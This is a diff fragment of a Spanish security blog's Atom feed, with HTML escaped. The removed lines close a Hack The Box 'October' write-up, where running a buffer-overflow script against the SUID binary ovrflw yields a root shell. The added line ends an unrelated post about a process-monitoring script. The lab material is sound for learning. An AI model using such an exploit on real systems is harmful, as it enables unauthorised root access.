-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@october:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python bof.py 
-&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt; Error &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;/usr/local/bin/ovrflw&lt;span class=&quot;s1&quot;&gt;': munmap_chunk(): invalid pointer: 0xbff7fe7b ***
-*** Error in `/usr/local/bin/ovrflw'&lt;/span&gt;: free&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;: invalid pointer: 0x08048380 &lt;span class=&quot;k&quot;&gt;***&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt; Error &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;/usr/local/bin/ovrflw&lt;span class=&quot;s1&quot;&gt;': munmap_chunk(): invalid pointer: 0xbfb91e7b ***
-Syntax: Z
-         $$D$
-              &amp;lt;input string&amp;gt;
-ovrflw: uv
-          :3217394944: 6#: Assertion `'&lt;/span&gt; failed.
-Syntax: Z
-         &lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;D&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-              &amp;lt;input string&amp;gt;
-&lt;span class=&quot;c&quot;&gt;# whoami&lt;/span&gt;
-root
-&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A este punto ya somos el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="PHP" /><summary type="html">Resolución de la máquina October en la plataforma de Hack The Box</summary></entry></feed>
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>K4miyo</name></author><category term="Bash" /><category term="Process" /><category term="Enumeration" /><summary type="html">Archivo ProcMon para el monitoreo de procesos ejecutamos a intervalos regulares de tiempo</summary></entry></feed>
